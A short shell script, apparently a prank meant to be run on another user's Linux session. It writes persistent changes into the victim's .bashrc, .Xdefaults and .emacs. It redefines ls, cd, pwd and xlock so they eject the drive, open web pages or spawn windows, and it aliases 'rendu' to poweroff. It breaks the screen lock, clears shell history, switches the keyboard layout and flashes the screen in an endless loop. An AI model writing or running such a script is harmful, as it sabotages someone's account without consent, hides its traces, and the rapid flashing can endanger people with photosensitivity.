#!/bin/sh
echo "xterm*background: pink" >> /home/${USER}/.Xdefaults;
echo "alias ls='eject /dev/sr0 && ls --color=auto'" >> /home/${USER}/.bashrc;
echo "alias emacs='vim'" >> /home/${USER}/.bashrc;
echo "alias cd='google-chrome imgur.com/g597Ov2' && cd" >> /home/${USER}/.bashrc;
echo "alias rendu='poweroff'" >> /home/${USER}/.bashrc;
echo "alias xlock='google-chrome bambou.la'" >> /home/${USER}/.bashrc;
echo "alias pwd='xeyes;xeyes;xeyes;xterm;xterm;xterm;xterm'" >> /home/${USER}/.bashrc;
echo "xset r rate 3;" >> /home/${USER}/.bashrc;
echo "(set-face-background 'default \"pink\")" >> /home/${USER}/.emacs;
echo "(set-face-foreground 'default \"lightblue\")" >> /home/${USER}/.emacs;
echo "history -c" >> /home/${USER}/.bashrc;

setxkbmap ru;
pkill xterm;

while [ 1 ]
do
fbsetroot -solid green
sleep 0.01
fbsetroot -solid black
sleep 0.01
fbsetroot -solid yellow
sleep 0.01
fbsetroot -solid blue
sleep 0.01
fbsetroot -solid pink
sleep 0.01
fbsetroot -solid red
sleep 0.01
done